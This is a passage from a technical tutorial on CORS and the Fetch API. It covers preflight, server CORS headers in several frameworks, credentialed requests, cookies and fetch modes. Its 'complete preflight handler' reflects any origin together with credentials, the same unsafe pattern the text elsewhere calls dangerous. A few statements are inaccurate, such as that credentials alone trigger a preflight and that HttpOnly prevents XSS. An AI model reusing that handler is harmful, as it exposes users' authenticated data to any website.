Access-Control-Allow-Credentials: true
Content-Type: application/json
```

### Performance Implications

#### Simple Requests

- **One network round-trip**: Direct request to server
- **Lower latency**: No preflight delay
- **Less server load**: Fewer requests processed

#### Complex Requests

- **Two network round-trips**: Preflight OPTIONS + actual request
- **Higher latency**: Additional round-trip time (can be 50-200ms or more)
- **Increased server load**: Double the requests for uncached preflights
- **Mitigation**: Use `Access-Control-Max-Age` to cache preflight results

### Credentials and CORS

#### Including Credentials

For both simple and complex requests, credentials require explicit opt-in:

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include', // Required to send cookies/auth
  headers: {
    'Content-Type': 'application/json'
  }
});
```

#### Server Requirements with Credentials

```http
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Credentials: true
```

**Critical restrictions**:

- Cannot use wildcard `*` for `Access-Control-Allow-Origin`
- Cannot use wildcard `*` for `Access-Control-Allow-Headers`
- Cannot use wildcard `*` for `Access-Control-Allow-Methods`

### Optimization Strategies

#### Minimize Complex Requests

When possible, design APIs to use simple requests:

- Use `GET` with query parameters instead of `POST` with JSON
- Avoid custom headers when alternatives exist
- Use simple `Content-Type` values for `POST`

#### Maximize Preflight Caching

Set long `Access-Control-Max-Age` values:

```http
Access-Control-Max-Age: 86400
```

[Inference: This typically provides 24-hour caching, though actual browser behavior may vary]

#### Conditional CORS Headers

Only include CORS headers when necessary:

```javascript
// Server-side logic
if (request.headers.origin && isAllowedOrigin(request.headers.origin)) {
  response.setHeader('Access-Control-Allow-Origin', request.headers.origin);
}
```

### Common Patterns

#### JSON API Request (Complex)

```javascript
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json', // Triggers preflight
  },
  body: JSON.stringify({ name: 'John' })
});
```

#### Authenticated Request (Complex)

```javascript
fetch('https://api.example.com/protected', {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer token', // Triggers preflight
  },
  credentials: 'include'
});
```

#### Form Submission (Simple)

```javascript
const formData = new FormData();
formData.append('name', 'John');

fetch('https://api.example.com/submit', {
  method: 'POST',
  body: formData // Content-Type: multipart/form-data (simple)
});
```

### Error Scenarios

#### Preflight Failure

If the preflight fails, the actual request never executes:

```javascript
fetch('https://api.example.com/data', {
  method: 'DELETE'
})
.catch(error => {
  // Error occurs during preflight, not actual request
  console.error('CORS preflight failed:', error);
});
```

#### Missing CORS Headers

```javascript
// Server responds without Access-Control-Allow-Origin
// Browser blocks the response from reaching JavaScript
fetch('https://api.example.com/data')
.then(response => response.json())
.catch(error => {
  // TypeError: Failed to fetch (CORS error)
});
```

#### Wildcard with Credentials

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

This combination is invalid and the browser will block the request.

### Debugging Complex vs Simple Requests

#### Browser DevTools Network Tab

- **Simple requests**: Single request entry
- **Complex requests**: Two entries (OPTIONS preflight + actual request)

#### Console Warnings

Browsers log CORS errors to the console:

```
Access to fetch at 'https://api.example.com' from origin 'https://yourdomain.com' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present
```

#### Checking Request Type

Examine the Network tab:

- Preflight shows `OPTIONS` method with `Access-Control-Request-*` headers
- Status code `204 No Content` typically indicates successful preflight
- Check `Access-Control-Max-Age` to see cache duration

---

## CORS Headers (Server-Side)

### Access-Control-Allow-Origin

The fundamental CORS header that specifies which origins can access the resource.

**Syntax:**

```
Access-Control-Allow-Origin: <origin>
Access-Control-Allow-Origin: *
```

**Specific origin:**

```http
Access-Control-Allow-Origin: https://example.com
```

**Wildcard (any origin):**

```http
Access-Control-Allow-Origin: *
```

**Dynamic origin reflection:**

```javascript
// Node.js/Express example
app.use((req, res, next) => {
  const allowedOrigins = ['https://app1.com', 'https://app2.com'];
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});
```

**Critical limitation:** When using credentials (`Access-Control-Allow-Credentials: true`), you cannot use `*`. You must specify an exact origin.

### Access-Control-Allow-Methods

Specifies which HTTP methods are permitted for cross-origin requests.

**Syntax:**

```
Access-Control-Allow-Methods: <method>, <method>, ...
```

**Example:**

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

**Common patterns:**

```javascript
// Read-only API
res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS');

// Full CRUD operations
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
```

This header is sent in response to preflight requests and defines which methods the actual request may use.

### Access-Control-Allow-Headers

Specifies which request headers can be used in the actual request.

**Syntax:**

```
Access-Control-Allow-Headers: <header>, <header>, ...
```

**Example:**

```http
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
```

**Dynamic reflection pattern:**

```javascript
app.use((req, res, next) => {
  const requestHeaders = req.headers['access-control-request-headers'];
  if (requestHeaders) {
    res.setHeader('Access-Control-Allow-Headers', requestHeaders);
  }
  next();
});
```

**Common headers to allow:**

- `Content-Type` - for JSON/XML payloads
- `Authorization` - for bearer tokens
- `X-Custom-Header` - application-specific headers
- `Accept` - content negotiation
- `X-CSRF-Token` - CSRF protection

### Access-Control-Allow-Credentials

Indicates whether the response can be exposed when credentials flag is true.

**Syntax:**

```
Access-Control-Allow-Credentials: true
```

**Note:** The only valid value is `true`. Omit the header entirely if credentials shouldn't be allowed.

**Server implementation:**

```javascript
res.setHeader('Access-Control-Allow-Credentials', 'true');
res.setHeader('Access-Control-Allow-Origin', 'https://specific-origin.com'); // Cannot use *
```

**Client-side requirement:**

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include'  // Required on client side
});
```

Enables cookies, authorization headers, and TLS client certificates to be sent cross-origin.

### Access-Control-Expose-Headers

Specifies which response headers should be accessible to the client-side script.

**Syntax:**

```
Access-Control-Expose-Headers: <header>, <header>, ...
```

**Default exposed headers (safe-listed):**

- `Cache-Control`
- `Content-Language`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

**Example for custom headers:**

```http
Access-Control-Expose-Headers: X-Total-Count, X-Page-Number, ETag
```

**Server implementation:**

```javascript
res.setHeader('X-Total-Count', '150');
res.setHeader('X-Page-Number', '3');
res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count, X-Page-Number');
```

**Client-side access:**

```javascript
fetch('https://api.example.com/items')
  .then(response => {
    const totalCount = response.headers.get('X-Total-Count'); // Now accessible
  });
```

### Access-Control-Max-Age

Specifies how long preflight request results can be cached.

**Syntax:**

```
Access-Control-Max-Age: <delta-seconds>
```

**Example:**

```http
Access-Control-Max-Age: 86400
```

**Common values:**

- `86400` - 24 hours (recommended for production)
- `600` - 10 minutes (development)
- `3600` - 1 hour (moderate caching)

**Implementation:**

```javascript
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Max-Age', '86400');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.sendStatus(204);
});
```

**Browser limitations:** Different browsers impose their own maximum limits (typically 5-10 minutes for Chromium, 24 hours for Firefox).

### Preflight Request Handling

Browsers send preflight requests using the OPTIONS method before certain cross-origin requests.

**Triggers for preflight:**

- Methods other than GET, HEAD, POST
- POST requests with Content-Type other than:
    - `application/x-www-form-urlencoded`
    - `multipart/form-data`
    - `text/plain`
- Custom headers beyond safe-listed ones
- Readable streams in request body

**Complete preflight handler:**

```javascript
// Express example
app.options('/api/*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  res.setHeader('Access-Control-Max-Age', '86400');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(204); // No content
});
```

**Preflight request example:**

```http
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

**Preflight response example:**

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

### Complete Server Implementation Examples

**Express.js:**

```javascript
const express = require('express');
const app = express();

// CORS middleware
app.use((req, res, next) => {
  const allowedOrigins = [
    'https://app.example.com',
    'https://admin.example.com'
  ];
  
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token');
  res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count, X-Rate-Limit');
  res.setHeader('Access-Control-Max-Age', '86400');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  
  next();
});

// Routes
app.get('/api/data', (req, res) => {
  res.json({ data: 'example' });
});
```

**Fastify:**

```javascript
const fastify = require('fastify')();

fastify.register(require('@fastify/cors'), {
  origin: ['https://app.example.com', 'https://admin.example.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count'],
  maxAge: 86400
});
```

**Node.js HTTP module:**

```javascript
const http = require('http');

const server = http.createServer((req, res) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://app.example.com'];
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }
  
  // Handle actual request
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ message: 'Success' }));
});
```

**Python Flask:**

```python
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)

# Basic CORS
CORS(app, 
     origins=['https://app.example.com', 'https://admin.example.com'],
     methods=['GET', 'POST', 'PUT', 'DELETE'],
     allow_headers=['Content-Type', 'Authorization'],
     expose_headers=['X-Total-Count'],
     supports_credentials=True,
     max_age=86400)

@app.route('/api/data')
def get_data():
    return jsonify({'data': 'example'})
```

**Django:**

```python
# settings.py
CORS_ALLOWED_ORIGINS = [
    "https://app.example.com",
    "https://admin.example.com",
]

CORS_ALLOW_CREDENTIALS = True

CORS_ALLOW_METHODS = [
    'DELETE',
    'GET',
    'OPTIONS',
    'PATCH',
    'POST',
    'PUT',
]

CORS_ALLOW_HEADERS = [
    'accept',
    'authorization',
    'content-type',
    'x-csrf-token',
]

CORS_EXPOSE_HEADERS = [
    'x-total-count',
]

CORS_PREFLIGHT_MAX_AGE = 86400
```

### Security Considerations

**Never use wildcard with credentials:**

```javascript
// DANGEROUS - Browser will reject
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

**Validate origins from whitelist:**

```javascript
const ALLOWED_ORIGINS = [
  'https://app.example.com',
  'https://admin.example.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  } else {
    // Log suspicious origins
    console.warn(`Blocked CORS request from: ${origin}`);
  }
  
  next();
});
```

**Avoid reflecting origin without validation:**

```javascript
// DANGEROUS - Allows any origin
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);

// SAFE - Validate first
const origin = req.headers.origin;
if (isAllowedOrigin(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```

**Limit exposed headers:**

```javascript
// Don't expose sensitive headers
res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count, X-Page');
// Not: 'Set-Cookie, Authorization, X-API-Key'
```

**Minimize Max-Age in development:**

```javascript
const maxAge = process.env.NODE_ENV === 'production' ? 86400 : 600;
res.setHeader('Access-Control-Max-Age', maxAge);
```

### Common CORS Errors and Solutions

**Error: "No 'Access-Control-Allow-Origin' header"**

```javascript
// Solution: Add the header to response
res.setHeader('Access-Control-Allow-Origin', 'https://your-app.com');
```

**Error: "Credentials mode is 'include' but Access-Control-Allow-Origin is '*'"**

```javascript
// Solution: Use specific origin with credentials
res.setHeader('Access-Control-Allow-Origin', 'https://your-app.com');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

**Error: "Method X is not allowed by Access-Control-Allow-Methods"**

```javascript
// Solution: Add the method to allowed methods
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH');
```

**Error: "Request header X is not allowed"**

```javascript
// Solution: Add header to Access-Control-Allow-Headers
res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Custom-Header');
```

**Error: Preflight request not handled**

```javascript
// Solution: Handle OPTIONS method
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://your-app.com');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.sendStatus(204);
});
```

### Advanced Patterns

**Origin pattern matching:**

```javascript
function isAllowedOrigin(origin) {
  const allowedPatterns = [
    /^https:\/\/.*\.example\.com$/,  // All subdomains
    /^http:\/\/localhost:\d+$/,       // Localhost with any port
  ];
  
  return allowedPatterns.some(pattern => pattern.test(origin));
}

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && isAllowedOrigin(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});
```

**Per-route CORS configuration:**

```javascript
const strictCors = (req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://trusted.example.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
};

const publicCors = (req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
};

app.get('/api/public', publicCors, getPublicData);
app.get('/api/private', strictCors, getPrivateData);
```

**Conditional credentials:**

```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (trustedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  } else if (publicOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    // No credentials
  }
  
  next();
});
```

**Vary header for caching:**

```javascript
app.use((req, res, next) => {
  // Indicate that response varies by Origin header
  res.setHeader('Vary', 'Origin');
  
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  
  next();
});
```

### Testing CORS Configuration

**Using curl:**

```bash
# Preflight request
curl -X OPTIONS https://api.example.com/data \
  -H "Origin: https://app.example.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v

# Actual request
curl -X POST https://api.example.com/data \
  -H "Origin: https://app.example.com" \
  -H "Content-Type: application/json" \
  -d '{"test": "data"}' \
  -v
```

**Using fetch in browser console:**

```javascript
// Test credentials
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ test: 'data' })
})
.then(response => {
  console.log('Headers:', [...response.headers]);
  return response.json();
})
.catch(error => console.error('CORS Error:', error));
```

---

## Credentials and Cookies

### The `credentials` Option

The `credentials` option controls whether cookies, authorization headers, and TLS client certificates are sent with cross-origin requests.

#### Available Values

**`omit`**

- Never sends credentials, even for same-origin requests
- Use when you explicitly don't want authentication information sent

```javascript
fetch('https://api.example.com/data', {
  credentials: 'omit'
});
```

**`same-origin`** (default)

- Sends credentials only for same-origin requests
- Cross-origin requests exclude cookies and auth headers
- Most secure default for preventing credential leakage

```javascript
fetch('https://api.example.com/data', {
  credentials: 'same-origin'
});
```

**`include`**

- Sends credentials with both same-origin and cross-origin requests
- Requires proper CORS headers from the server
- Essential for authenticated cross-origin requests

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include'
});
```

### CORS Requirements for Credentialed Requests

When using `credentials: 'include'`, the server must explicitly allow credentialed requests through specific headers.

#### Required Server Headers

**`Access-Control-Allow-Credentials: true`**

- Must be explicitly set to `true`
- Tells the browser that the server permits credentialed requests
- Without this header, the browser rejects the response

```http
Access-Control-Allow-Credentials: true
```

**`Access-Control-Allow-Origin`**

- Cannot use wildcard (`*`) with credentialed requests
- Must specify the exact origin
- Multiple origins require dynamic generation based on request origin

```http
// Valid with credentials
Access-Control-Allow-Origin: https://example.com

// Invalid with credentials
Access-Control-Allow-Origin: *
```

**`Access-Control-Allow-Headers`**

- Cannot use wildcard (`*`) when credentials are included
- Must explicitly list allowed headers

```http
// Valid
Access-Control-Allow-Headers: Content-Type, Authorization

// Invalid with credentials
Access-Control-Allow-Headers: *
```

**`Access-Control-Allow-Methods`**

- Cannot use wildcard (`*`) with credentialed requests
- Must explicitly list allowed methods

```http
// Valid
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

// Invalid with credentials
Access-Control-Allow-Methods: *
```

### Cookie Behavior with CORS

#### Same-Origin Requests

Cookies are automatically sent with same-origin requests regardless of the `credentials` option (unless explicitly set to `omit`).

```javascript
// Cookies sent automatically
fetch('/api/user');

// Same as above (default behavior)
fetch('/api/user', {
  credentials: 'same-origin'
});
```

#### Cross-Origin Requests

Cookies are only sent cross-origin when explicitly using `credentials: 'include'` and the server allows it.

```javascript
// Cookies NOT sent
fetch('https://api.example.com/user');

// Cookies sent (if server allows)
fetch('https://api.example.com/user', {
  credentials: 'include'
});
```

#### Setting Cookies Cross-Origin

For the browser to store cookies from a cross-origin response, the server must set appropriate `SameSite` attributes on cookies.

**Server Response Headers:**

```http
Set-Cookie: sessionId=abc123; SameSite=None; Secure
```

**`SameSite` Attribute Values:**

- `Strict` - Cookie only sent to same-site requests
- `Lax` - Cookie sent with top-level navigation and same-site requests (default in modern browsers)
- `None` - Cookie sent with cross-origin requests (requires `Secure` flag)

### Preflight Requests with Credentials

Cross-origin requests with credentials trigger a preflight OPTIONS request to verify server permissions.

#### Client Request Sequence

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'value' })
});
```

#### Preflight OPTIONS Request

```http
OPTIONS /data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

#### Required Preflight Response

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

#### Actual POST Request

Only sent if preflight succeeds:

```http
POST /data HTTP/1.1
Host: api.example.com
Origin: https://example.com
Cookie: sessionId=abc123
Content-Type: application/json
```

### Security Considerations

#### CSRF Protection

Credentialed cross-origin requests are vulnerable to CSRF attacks. Implement additional protection:

**CSRF Token Pattern:**

```javascript
// Fetch CSRF token first
const tokenResponse = await fetch('https://api.example.com/csrf-token', {
  credentials: 'include'
});
const { csrfToken } = await tokenResponse.json();

// Use token in subsequent requests
await fetch('https://api.example.com/action', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ action: 'update' })
});
```

#### Cookie Security Attributes

Always use secure cookie attributes when working with credentials:

```http
Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=None
```

- `Secure` - Cookie only sent over HTTPS
- `HttpOnly` - Cookie inaccessible to JavaScript (prevents XSS)
- `SameSite=None` - Required for cross-origin cookies (must use with `Secure`)

#### Origin Validation

Server-side origin validation is critical:

```javascript
// Server-side example (Node.js/Express)
const allowedOrigins = ['https://example.com', 'https://app.example.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});
```

### Common Patterns and Best Practices

#### Authenticated API Wrapper

```javascript
class AuthenticatedAPI {
  constructor(baseURL) {
    this.baseURL = baseURL;
  }
  
  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    
    const response = await fetch(url, {
      ...options,
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      }
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return response.json();
  }
  
  get(endpoint) {
    return this.request(endpoint);
  }
  
  post(endpoint, data) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
}

// Usage
const api = new AuthenticatedAPI('https://api.example.com');
const userData = await api.get('/user/profile');
```

#### Handling Credential Errors

```javascript
async function authenticatedRequest(url) {
  try {
    const response = await fetch(url, {
      credentials: 'include'
    });
    
    if (response.status === 401) {
      // Credentials invalid or expired
      console.error('Authentication required');
      // Redirect to login or refresh token
      return null;
    }
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    if (error.name === 'TypeError') {
      // CORS error or network failure
      console.error('CORS or network error:', error);
    }
    throw error;
  }
}
```

#### Token-Based Authentication Alternative

For scenarios where cookies are problematic, use token-based authentication:

```javascript
class TokenAPI {
  constructor(baseURL) {
    this.baseURL = baseURL;
    this.token = localStorage.getItem('authToken');
  }
  
  setToken(token) {
    this.token = token;
    localStorage.setItem('authToken', token);
  }
  
  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    
    const response = await fetch(url, {
      ...options,
      // No credentials needed - token in header
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${this.token}`,
        ...options.headers
      }
    });
    
    return response.json();
  }
}
```

### Browser Compatibility Notes

[Inference] Different browsers may handle credential inclusion timing differently during page load, particularly for cached resources versus dynamic requests.

The `credentials` option is supported in all modern browsers, but older implementations may have inconsistencies in preflight handling.

### Debugging Credentials and CORS

#### Common Issues

**Issue: Cookies not sent with cross-origin request**

- Check: `credentials: 'include'` is set
- Check: Server sends `Access-Control-Allow-Credentials: true`
- Check: Server sends specific origin (not `*`)
- Check: Cookie has `SameSite=None; Secure`

**Issue: Preflight request fails**

- Check: Server handles OPTIONS method
- Check: All required CORS headers present in preflight response
- Check: No wildcard headers/methods with credentialed requests

**Issue: Response rejected despite successful request**

- Check: Response headers match preflight promises
- Check: `Access-Control-Allow-Credentials` present in actual response

#### Browser DevTools

Monitor credential behavior in browser DevTools:

1. Network tab → Request headers → Check `Cookie` header presence
2. Network tab → Response headers → Verify CORS headers
3. Console → Look for CORS error messages
4. Application/Storage tab → Check cookie attributes

### Cross-Origin Credential Patterns by Scenario

#### Public API (No Authentication)

```javascript
fetch('https://api.example.com/public-data', {
  credentials: 'omit'
});
```

#### Same-Origin Authenticated Requests

```javascript
fetch('/api/user/profile', {
  credentials: 'same-origin' // or omit (default)
});
```

#### Cross-Origin Authenticated Requests

```javascript
fetch('https://api.example.com/user/profile', {
  credentials: 'include'
});
```

#### Subdomain Requests

```javascript
// From example.com to api.example.com
fetch('https://api.example.com/data', {
  credentials: 'include' // Required even for subdomains
});
```

---

## Mode Options in Fetch API

The `mode` option in the Fetch API controls how the request interacts with the browser's CORS (Cross-Origin Resource Sharing) policy and determines what kind of response you can receive.

### `cors` Mode

The default mode for cross-origin requests. Enables full CORS protocol.

**Behavior:**

- Sends CORS preflight (OPTIONS) request for non-simple requests
- Includes `Origin` header in the request
- Server must respond with appropriate CORS headers (`Access-Control-Allow-Origin`, etc.)
- If server doesn't send proper CORS headers, request fails with a network error
- Response is fully readable in JavaScript

**Use cases:**

- Accessing third-party APIs that support CORS
- Cross-origin requests where you need to read the response body
- When you need access to response headers
- Default choice for most cross-origin fetches

**Request characteristics:**

```javascript
fetch('https://api.example.com/data', {
  mode: 'cors',
  credentials: 'include', // Can send cookies cross-origin if allowed
  headers: {
    'Content-Type': 'application/json'
  }
})
```

**Server requirements:**

- Must send `Access-Control-Allow-Origin` header
- For credentialed requests: `Access-Control-Allow-Credentials: true`
- For custom headers: `Access-Control-Allow-Headers` with allowed headers
- For non-GET/POST: Preflight handling with proper `Access-Control-Allow-Methods`

**Failure scenarios:**

- Server doesn't send CORS headers → Network error
- Origin not in allowed origins → Network error
- Preflight rejected → Network error

### `no-cors` Mode

Severely restricted mode for cross-origin requests. Allows the request to proceed but limits response access.

**Behavior:**

- No preflight requests sent, even for non-simple requests
- Request proceeds regardless of server's CORS configuration
- Response is **opaque** - JavaScript cannot read body, headers, or status
- Only simple request methods allowed (GET, HEAD, POST)
- Only simple headers allowed (Accept, Accept-Language, Content-Language, Content-Type with limited values)
- `Content-Type` restricted to: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

**Response characteristics:**

```javascript
fetch('https://third-party.com/resource', {
  mode: 'no-cors'
}).then(response => {
  console.log(response.type); // 'opaque'
  console.log(response.status); // 0
  console.log(response.ok); // false
  console.log(response.statusText); // ''
  // response.json() → Fails
  // response.text() → Returns empty string
  // response.headers.get() → Returns null
})
```

**Use cases:**

- Loading resources where you don't need to read the response (images, scripts via Service Worker)
- Making fire-and-forget requests (analytics, logging)
- Caching cross-origin resources in Service Workers
- Sending data to servers that don't support CORS but will process the request anyway

**Critical limitations:**

- Cannot determine if request succeeded or failed
- Cannot read any response data
- Cannot access response headers
- Status always appears as 0
- Response body is not accessible

**Common pitfall:**

```javascript
// This looks like it works but you can't verify success
fetch('https://api.without-cors.com/log', {
  mode: 'no-cors',
  method: 'POST',
  body: JSON.stringify({event: 'click'})
})
// You'll never know if this succeeded
```

**Service Worker caching:**

```javascript
// Valid use case in Service Worker
self.addEventListener('fetch', event => {
  if (event.request.url.includes('cdn.example.com')) {
    event.respondWith(
      caches.match(event.request).then(cached => {
        return cached || fetch(event.request, {mode: 'no-cors'})
          .then(response => {
            // Can cache opaque response
            caches.open('v1').then(cache => cache.put(event.request, response.clone()));
            return response;
          })
      })
    );
  }
});
```

### `same-origin` Mode

Strictly enforces same-origin requests only.

**Behavior:**

- Request must be to the same origin (protocol + domain + port)
- Any cross-origin request immediately fails with TypeError
- No CORS checks needed since only same-origin allowed
- Full access to response (not opaque)

**Use cases:**

- Security-sensitive operations where cross-origin requests must be prevented
- Internal APIs that should never be called cross-origin
- Preventing accidental cross-origin requests during development
- Explicit same-origin enforcement for sensitive data

**Example:**

```javascript
// Same origin: https://example.com/api/data
fetch('/api/data', {
  mode: 'same-origin'
}) // Success

// Different origin: https://api.example.com/data
fetch('https://api.example.com/data', {
  mode: 'same-origin'
}) // TypeError: Failed to fetch

// Even subdomains fail
fetch('https://sub.example.com/data', {
  mode: 'same-origin'
}) // TypeError: Failed to fetch
```

**Security benefit:**

```javascript
// Prevent CSRF-like attacks by ensuring request stays on same origin
async function deleteAccount() {
  return fetch('/api/account', {
    mode: 'same-origin', // Guarantees no cross-origin manipulation
    method: 'DELETE',
    credentials: 'same-origin'
  });
}
```

**Error handling:**

```javascript
fetch('https://different-origin.com/api', {
  mode: 'same-origin'
})
.catch(err => {
  // TypeError: Failed to fetch
  // Fails before network request is even attempted
  console.error('Cross-origin request blocked:', err);
});
```

### `navigate` Mode

[Inference] Reserved for browser navigation requests. Not typically used in application code.

**Behavior:**

- Used internally by browsers for document navigation
- Handles redirects differently than other modes
- [Unverified] May have special handling for navigation-specific security policies

**Practical note:** This mode is primarily internal to browser navigation and rarely needs to be set explicitly in fetch calls.

### Mode Comparison Table

|Feature|`cors`|`no-cors`|`same-origin`|
|---|---|---|---|
|Cross-origin allowed|Yes (with CORS)|Yes|No|
|Response readable|Yes|No (opaque)|Yes|
|Status code accessible|Yes|No (always 0)|Yes|
|Headers accessible|Yes|No|Yes|
|Preflight sent|Yes (when needed)|No|N/A|
|Server CORS required|Yes|No|N/A|
|Custom headers allowed|Yes (if preflight passes)|No|Yes|
|All HTTP methods|Yes (if preflight passes)|Only simple|Yes|

### Mode Selection Decision Tree

**Need to read the response?**

- Yes → Don't use `no-cors`
    - Cross-origin? → Use `cors` (ensure server supports CORS)
    - Same-origin? → Use `same-origin` or `cors` (default)
- No → Could use `no-cors` if cross-origin and server lacks CORS

**Security requirement to prevent cross-origin?**

- Yes → Use `same-origin`
- No → Use `cors` (default)

**Server doesn't support CORS but you just need to send data?**

- Use `no-cors` (but you cannot verify delivery)

### Common Patterns

**Graceful fallback [Inference - behavior pattern]:**

```javascript
async function fetchWithFallback(url) {
  try {
    // Try with CORS first
    const response = await fetch(url, {mode: 'cors'});
    return await response.json();
  } catch (corsError) {
    // If CORS fails and we don't need response, fall back
    await fetch(url, {mode: 'no-cors'});
    // Note: We can't verify this succeeded
    throw new Error('CORS failed, sent no-cors request');
  }
}
```

**Strict same-origin for sensitive operations:**

```javascript
async function updatePassword(newPassword) {
  return fetch('/api/password', {
    mode: 'same-origin',
    method: 'PUT',
    credentials: 'same-origin',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: newPassword})
  });
}
```

**Cross-origin API with CORS:**

```javascript
async function fetchUserData(userId) {
  const response = await fetch(`https://api.example.com/users/${userId}`, {
    mode: 'cors',
    credentials: 'include', // Send cookies if needed
    headers: {
      'Authorization': 'Bearer ' + token
    }
  });
  
  if (!response.ok) {
